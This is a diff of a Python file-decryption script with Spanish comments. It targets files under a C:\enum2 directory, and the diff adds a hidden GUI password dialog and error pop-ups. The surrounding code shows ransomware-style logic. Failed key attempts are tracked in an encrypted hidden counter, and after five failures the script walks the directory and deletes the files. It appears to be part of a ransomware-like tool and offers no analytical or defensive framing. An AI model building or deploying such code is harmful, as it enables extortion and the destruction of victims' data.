@@ -1,4 +1,6 @@
 import os
+import tkinter as tk
+from tkinter import simpledialog, messagebox
 from cryptography.fernet import Fernet, InvalidToken
 from tqdm import tqdm
 
@@ -10,6 +12,9 @@ key_path = 'C:\\enum2\\key.key'
 
 # Archivo de intentos fallidos
 attempts_path = 'C:\\enum2\\.decrypt_attempts'
+
+# Archivo de registro para `tqdm`
+log_file_path = 'C:\\enum2\\decrypt_log.txt'
 
 # Generar una clave interna para cifrar el contador de intentos
 internal_key = Fernet.generate_key()
@@ -53,12 +58,21 @@ def should_exclude(path):
     return False
 
 # Solicita la clave de encriptación al usuario y verifica si es correcta
+def get_encryption_key():
+    root = tk.Tk()
+    root.withdraw()
+    return simpledialog.askstring("Clave de encriptación", "Introduce la clave de encriptación:", show='*')
+
 key = None
 cipher = None
 is_valid_key = False
 
 while not is_valid_key and attempts < 5:
-    key = input("Introduce la clave de encriptación: ").encode()
+    key = get_encryption_key()
+    if key is None:
+        print("Operación cancelada por el usuario.")
+        exit()
+    key = key.encode()
     try:
         cipher = Fernet(key)
         # Probar desencriptar algo para verificar la clave
@@ -85,9 +99,9 @@ while not is_valid_key and attempts < 5:
         with open(attempts_path, 'wb') as attempts_file:
             attempts_file.write(encrypted_attempts)
         if attempts < 5:
-            print(f"Clave de encriptación incorrecta. Te quedan {5 - attempts} intentos.")
+            messagebox.showerror("Clave incorrecta", f"Clave de encriptación incorrecta. Te quedan {5 - attempts} intentos.")
         else:
-            print("Número máximo de intentos fallidos alcanzado. Eliminando archivos.")
+            messagebox.showerror("Máximo de intentos alcanzado", "Número máximo de intentos fallidos alcanzado. Eliminando archivos.")
             for dirpath, dirnames, filenames in os.walk(root_dir):
                 if should_exclude(dirpath):
                     continue
@@ -115,13 +129,15 @@ if is_valid_key:
 
     total_files = sum([len(files) for r, d, files in os.walk(root_dir) if not should_exclude(r)])
 
-    with tqdm(total=total_files, desc="Desencriptando archivos", unit="archivo") as pbar:
-        for dirpath, dirnames, filenames in os.walk(root_dir):
-            if should_exclude(dirpath):
-                continue
-            for filename in filenames:
-                filepath = os.path.join(dirpath, filename)
-                decrypt_and_restore_file(filepath)
-                pbar.update(1)
+    # Redirigir la salida de `tqdm` a un archivo de registro
+    with open(log_file_path, 'w') as log_file:
+        with tqdm(total=total_files, desc="Desencriptando archivos", unit="archivo", file=log_file) as pbar:
+            for dirpath, dirnames, filenames in os.walk(root_dir):
+                if should_exclude(dirpath):
+                    continue
+                for filename in filenames:
+                    filepath = os.path.join(dirpath, filename)
+                    decrypt_and_restore_file(filepath)
+                    pbar.update(1)
 
     print("Archivos desencriptados y restaurados con sus nombres y rutas originales.")
